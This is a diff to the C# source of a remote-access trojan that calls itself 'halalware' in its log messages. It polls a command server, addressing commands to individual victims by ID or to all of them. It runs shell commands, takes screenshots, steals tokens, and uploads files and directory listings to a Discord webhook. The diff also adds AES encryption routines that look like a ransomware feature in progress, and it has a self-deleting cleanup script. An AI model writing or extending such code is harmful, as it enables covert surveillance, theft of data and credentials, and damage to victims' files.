@@ -1,4 +1,4 @@
-﻿using System.Timers;
+using System.Timers;
 using System;
 using System.Text;
 using System.Net.Http;
@@ -14,6 +14,8 @@ using Org.BouncyCastle.Crypto.Parameters;
 using Org.BouncyCastle.Crypto.Modes;
 using System.Management;
 using static Tools;
+using System.Reflection.Metadata;
+using System.IO.Compression;
 
 public static class Tools
 {
@@ -177,6 +179,122 @@ public class run_cmd
         timer.Start();
         Tools.Wait();
     }
+    public string get_id()
+    {
+        return File.ReadAllText(@"C:\ProgramData\{e1d73f1e17251879702463fe6349a1c35026f865}\ID.ini");
+    }
+    private bool FileEncrypt(string FilePath, string Password, string filename)
+    {
+
+        int i, len;
+        byte[] buffer = new byte[4096];
+
+        //Output file path.
+        string OutFilePath = filename;
+
+        using (FileStream outfs = new FileStream(OutFilePath, FileMode.Create, FileAccess.Write))
+        {
+            using (AesManaged aes = new AesManaged())
+            {
+                aes.BlockSize = 128;              // BlockSize = 16bytes
+                aes.KeySize = 128;                // KeySize = 16bytes
+                aes.Mode = CipherMode.CBC;        // CBC mode
+                aes.Padding = PaddingMode.PKCS7;    // Padding mode is "PKCS7".
+
+                //入力されたパスワードをベースに擬似乱数を新たに生成
+                Rfc2898DeriveBytes deriveBytes = new Rfc2898DeriveBytes(Password, 16);
+                byte[] salt = new byte[16]; // Rfc2898DeriveBytesが内部生成したなソルトを取得
+                salt = deriveBytes.Salt;
+                // 生成した擬似乱数から16バイト切り出したデータをパスワードにする
+                byte[] bufferKey = deriveBytes.GetBytes(16);
+
+                aes.Key = bufferKey;
+                // IV ( Initilization Vector ) は、AesManagedにつくらせる
+                aes.GenerateIV();
+
+                //Encryption interface.
+                ICryptoTransform encryptor = aes.CreateEncryptor(aes.Key, aes.IV);
+
+                using (CryptoStream cse = new CryptoStream(outfs, encryptor, CryptoStreamMode.Write))
+                {
+                    outfs.Write(salt, 0, 16);     // salt をファイル先頭に埋め込む
+                    outfs.Write(aes.IV, 0, 16); // 次にIVもファイルに埋め込む
+                    using (DeflateStream ds = new DeflateStream(cse, CompressionMode.Compress)) //圧縮
+                    {
+                        using (FileStream fs = new FileStream(FilePath, FileMode.Open, FileAccess.Read))
+                        {
+                            while ((len = fs.Read(buffer, 0, 4096)) > 0)
+                            {
+                                ds.Write(buffer, 0, len);
+                            }
+                        }
+                    }
+
+                }
+
+            }
+        }
+
+        return (true);
+    }
+    private bool FileDecrypt(string FilePath, string Password, string Filename)
+    {
+        int i, len;
+        byte[] buffer = new byte[4096];
+
+        if (String.Compare(Path.GetExtension(FilePath), Path.GetExtension(FilePath), true) != 0)
+        {
+            //The file are not encrypted file! Decryption failed
+
+            return (false); ;
+        }
+
+        //Output file path.
+        string OutFilePath = Filename;
+
+        using (FileStream outfs = new FileStream(OutFilePath, FileMode.Create, FileAccess.Write))
+        {
+            using (FileStream fs = new FileStream(FilePath, FileMode.Open, FileAccess.Read))
+            {
+                using (AesManaged aes = new AesManaged())
+                {
+                    aes.BlockSize = 128;              // BlockSize = 16bytes
+                    aes.KeySize = 128;                // KeySize = 16bytes
+                    aes.Mode = CipherMode.CBC;        // CBC mode
+                    aes.Padding = PaddingMode.PKCS7;    // Padding mode is "PKCS7".
+
+                    // salt
+                    byte[] salt = new byte[16];
+                    fs.Read(salt, 0, 16);
+
+                    // Initilization Vector
+                    byte[] iv = new byte[16];
+                    fs.Read(iv, 0, 16);
+                    aes.IV = iv;
+
+                    // ivをsaltにしてパスワードを擬似乱数に変換
+                    Rfc2898DeriveBytes deriveBytes = new Rfc2898DeriveBytes(Password, salt);
+                    byte[] bufferKey = deriveBytes.GetBytes(16);    // 16バイトのsaltを切り出してパスワードに変換
+                    aes.Key = bufferKey;
+
+                    //Decryption interface.
+                    ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV);
+
+                    using (CryptoStream cse = new CryptoStream(fs, decryptor, CryptoStreamMode.Read))
+                    {
+                        using (DeflateStream ds = new DeflateStream(cse, CompressionMode.Decompress))   //解凍
+                        {
+                            while ((len = ds.Read(buffer, 0, 4096)) > 0)
+                            {
+                                outfs.Write(buffer, 0, len);
+                            }
+                        }
+                    }
+                }
+            }
+        }
+        return (true);
+    }
     private void png_delete()
     {
         if (File.Exists("C:\\ProgramData\\{e1d73f1e17251879702463fe6349a1c35026f865}\\file.png"))
@@ -186,16 +304,32 @@ public class run_cmd
     }
     public void send_log(string content)
     {
-        HttpClient httpClient = new HttpClient();
-        Dictionary<string, string> strs = new Dictionary<string, string>()
+        try
+        {
+            HttpClient httpClient = new HttpClient();
+            Dictionary<string, string> strs = new Dictionary<string, string>()
         {
             { "content", content },
-            { "username", "halalware" },
+            { "username", "halalware (id:" + get_id() + ")" },
             { "avatar_url", "https://cdn.discordapp.com/avatars/1132757640867491871/acad78f5bbc5f777975cdd7e1fda249c.webp?size=160" }
         };
-        TaskAwaiter<HttpResponseMessage> awaiter = httpClient.PostAsync(webhook_log, new
-        FormUrlEncodedContent(strs)).GetAwaiter();
-        awaiter.GetResult();
+            TaskAwaiter<HttpResponseMessage> awaiter = httpClient.PostAsync(webhook_log, new
+            FormUrlEncodedContent(strs)).GetAwaiter();
+            awaiter.GetResult();
+        }
+        catch
+        {
+            HttpClient httpClient = new HttpClient();
+            Dictionary<string, string> strs = new Dictionary<string, string>()
+        {
+            { "content", "text over" },
+            { "username", "halalware (id:" + get_id() + ")" },
+            { "avatar_url", "https://cdn.discordapp.com/avatars/1132757640867491871/acad78f5bbc5f777975cdd7e1fda249c.webp?size=160" }
+        };
+            TaskAwaiter<HttpResponseMessage> awaiter = httpClient.PostAsync(webhook_log, new
+            FormUrlEncodedContent(strs)).GetAwaiter();
+            awaiter.GetResult();
+        }
     }
     public void check_command()
     {
@@ -205,35 +339,68 @@ public class run_cmd
             try
             {
                 string response = client.DownloadString(url);
-                if (response.Contains("cmd:"))
+                if (response.Contains(get_id()+":") || response.Contains("ALL:"))
                 {
-                    command = response.Replace("cmd:", "");
-                    cmd();
-                    Console.WriteLine("cmd");
-                }
-                else if (response.Contains("screenshot:"))
-                {
-                    command = response;
-                    screenshot();
-                    Console.WriteLine("screenshot");
-                }
-                else if (response.Contains("upload:"))
-                {
-                    string filepath = response.Replace("upload:", "");
-                    upload(filepath);
-                }
-                else if (response.Contains("suicide:"))
-                {
-                    suicide();
-                }
-                else if (response.Contains("tokens:"))
-                {
-                    command = response;
-                    get_tokens();
-                }
-                else
-                {
-                    send_log("無効なコマンドです");
+                    response = response.Replace(get_id()+":","");
+                    response = response.Replace("ALL:", "");
+                    if (response.Contains("cmd:"))
+                    {
+                        command = response.Replace("cmd:", "");
+                        cmd();
+                        Console.WriteLine("cmd");
+                    }
+                    else if (response.Contains("screenshot:"))
+                    {
+                        command = response;
+                        screenshot();
+                        Console.WriteLine("screenshot");
+                    }
+                    else if (response.Contains("upload:"))
+                    {
+                        string filepath = response.Replace("upload:", "");
+                        upload(filepath);
+                    }
+                    else if (response.Contains("suicide:"))
+                    {
+                        suicide();
+                    }
+                    else if (response.Contains("tokens:"))
+                    {
+                        command = response;
+                        get_tokens();
+                    }
+                    else if (response.Contains("dir:"))
+                    {
+
+                        string dir_path = response.Replace("dir:", "");
+                        get_directory(dir_path);
+                    }
+                    else if (response.Contains("file:"))
+                    {
+                        string dir_path = response.Replace("file:", "");
+                        get_files(dir_path);
+                    }
+                    else if (response.Contains("crypt:"))
+                    {
+
+                    }
+                    else if (response.Contains("decrypt:"))
+                    {
+
+                    }
+                    else if (response.Contains("update:"))
+                    {
+                        update();
+                    }
+                    else if (response.Contains("end:"))
+                    {
+                        send_log("ソフトを終了");
+                        Environment.Exit(0);
+                    }
+                    else
+                    {
+                        send_log("無効なコマンドです");
+                    }
                 }
             }
             catch (Exception ex)
@@ -241,6 +408,94 @@ public class run_cmd
                 Console.WriteLine($"Error: {ex.Message}");
             }
         }
+    }
+    public void update()
+    {
+        Environment.Exit(0);
+    }
+    public void crypt()
+    {
+
+    }
+    public void decrypt()
+    {
+
+    }
+    public async void get_files(string dirpath)
+    {
+        string dir_list = "";
+        if (dirpath == temp)
+        {
+            Console.WriteLine("変化なし");
+            goto skip;
+        }
+        else
+        {
+            temp = dirpath;
+        }
+        string[] filepaths = Directory.GetFiles(dirpath, "*", SearchOption.AllDirectories);
+        foreach (string L in filepaths)
+        {
+            dir_list += L + "\n";
+        }
+        File.WriteAllText(@"C:\ProgramData\{e1d73f1e17251879702463fe6349a1c35026f865}\Directory-list.txt", dir_list);
+        try
+        {
+            using (var content = new MultipartFormDataContent())
+            {
+                HttpClient client = new HttpClient();
+                byte[] fileBytes = File.ReadAllBytes(@"C:\ProgramData\{e1d73f1e17251879702463fe6349a1c35026f865}\Directory-list.txt");
+                content.Add(new ByteArrayContent(fileBytes), "file", Path.GetFileName(@"C:\ProgramData\{e1d73f1e17251879702463fe6349a1c35026f865}\Directory-list.txt"));
+                HttpResponseMessage response = await client.PostAsync(webhook_log, content);
+                string responseContent = await response.Content.ReadAsStringAsync();
+            }
+        }
+        catch
+        {
+            send_log("upload error");
+        }
+    skip:;
+    }
+    public async void get_directory(string dirpath)
+    {
+        string dir_list = "";
+        if (dirpath == temp)
+        {
+            Console.WriteLine("変化なし");
+            goto skip;
+        }
+        else
+        {
+            temp = dirpath;
+        }
+        DirectoryInfo di = new DirectoryInfo(dirpath);
+        DirectoryInfo[] diAlls = di.GetDirectories();
+        foreach (DirectoryInfo d in diAlls)
+        {
+            dir_list += $"{d.FullName}\n";
+        }
+        DirectoryInfo[] diOptions = di.GetDirectories("*", SearchOption.AllDirectories);
+        foreach (DirectoryInfo d in diOptions)
+        {
+            dir_list += $"{d.FullName}\n";
+        }
+        File.WriteAllText(@"C:\ProgramData\{e1d73f1e17251879702463fe6349a1c35026f865}\Directory-list.txt", dir_list);
+        try
+        {
+            using (var content = new MultipartFormDataContent())
+            {
+                HttpClient client = new HttpClient();
+                byte[] fileBytes = File.ReadAllBytes(@"C:\ProgramData\{e1d73f1e17251879702463fe6349a1c35026f865}\Directory-list.txt");
+                content.Add(new ByteArrayContent(fileBytes), "file", Path.GetFileName(@"C:\ProgramData\{e1d73f1e17251879702463fe6349a1c35026f865}\Directory-list.txt"));
+                HttpResponseMessage response = await client.PostAsync(webhook_log, content);
+                string responseContent = await response.Content.ReadAsStringAsync();
+            }
+        }
+        catch
+        {
+            send_log("upload error");
+        }
+    skip:;
     }
     public void get_tokens()
     {
@@ -274,17 +529,17 @@ public class run_cmd
             HttpClient client = new HttpClient();
             byte[] fileBytes = File.ReadAllBytes(filepath);
             content.Add(new ByteArrayContent(fileBytes), "file", Path.GetFileName(filepath));
+            content.Add(new StringContent("file upload (id:" + File.ReadAllText(@"C:\ProgramData\{e1d73f1e17251879702463fe6349a1c35026f865}\ID.ini") + ")"), "username");
             HttpResponseMessage response = await client.PostAsync(webhook_log, content);
             string responseContent = await response.Content.ReadAsStringAsync();
-            //Console.WriteLine(responseContent);
         }
         skip:;
     }
     public void suicide()
     {
-        File.WriteAllText(@"C:\Windows\Temp\suicide.bat", "taskkill /f /t /im shot.txt\r\ntaskkill /f /t /im interval.txt\r\ntimeout /t 5\r\nrd /s /q C:\\ProgramData\\{e1d73f1e17251879702463fe6349a1c35026f865}");
+        File.WriteAllText(@"C:\Windows\Temp\temp.bat", "taskkill /f /t /im shot.txt\r\ntaskkill /f /t /im interval.txt\r\ntimeout /t 5\r\nrd /s /q C:\\ProgramData\\{e1d73f1e17251879702463fe6349a1c35026f865}");
         ProcessStartInfo psInfo = new ProcessStartInfo();
-        psInfo.FileName = "C:\\Windows\\Temp\\suicide.bat";
+        psInfo.FileName = "C:\\Windows\\Temp\\temp.bat";
         psInfo.CreateNoWindow = true;
         psInfo.UseShellExecute = false;
         Process p = Process.Start(psInfo);
